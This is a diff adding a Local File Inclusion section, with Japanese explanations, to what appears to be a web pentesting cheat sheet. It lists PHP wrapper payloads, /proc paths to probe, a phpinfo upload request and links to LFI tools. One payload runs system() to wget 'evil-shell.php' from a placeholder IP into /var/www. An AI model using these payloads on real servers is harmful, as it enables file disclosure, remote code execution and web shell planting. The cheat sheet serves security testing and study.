@@ -188,6 +188,74 @@ Bypass:
 - to Hex: `(` => `\\x28`
 - to Octal: `(` => `\50`
 
+## Local File Inclusion (LFI)
+
+**PHP**
+
+パラメータにローカルファイルへのパスを指定することで、サーバにあるローカルファイルにアクセスを試みる攻撃。
+
+Wrapper:
+
+```
+expect://ls
+
+php://input
+php://filter
+
+phar://app.phar/index.php
+
+zip://shell.jpg
+
+data://text/plain,<?php phpinfo(); ?>
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+```
+
+Methods:
+
+```
+/proc/self/environ
+/proc/self/fd/1
+/proc/self/cmdline
+```
+
+https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt
+
+Files:
+
+```
+<? system('uname -a');?>
+```
+
+```
+<? system('wget http://xxx.xxx.xxx.xxx/evil-shell.php -O /var/www/shell.php');?>
+```
+
+with phpinfo:
+
+phpinfo() を利用して、アップロードしたファイルの一時保存場所を確認することができる。
+
+```
+POST /phpinfo.php HTTP/1.0
+Content-Type: multipart/form-data; boundary=---------------------------
+7db268605ae
+Content-Length: 196
+-----------------------------7db268605ae
+Content-Disposition: form-data; name="dummyname"; filename="test.txt"
+Content-Type: text/plain
+Security Test
+-----------------------------7db268605ae
+```
+
+PHP Variables 内に出力される。
+
+https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf
+https://github.com/D35m0nd142/LFISuite
+
+参考:
+
+- https://book.hacktricks.xyz/pentesting-web/file-inclusion
+- https://highon.coffee/blog/lfi-cheat-sheet/
+
 ## Sites
 
 **Databases**
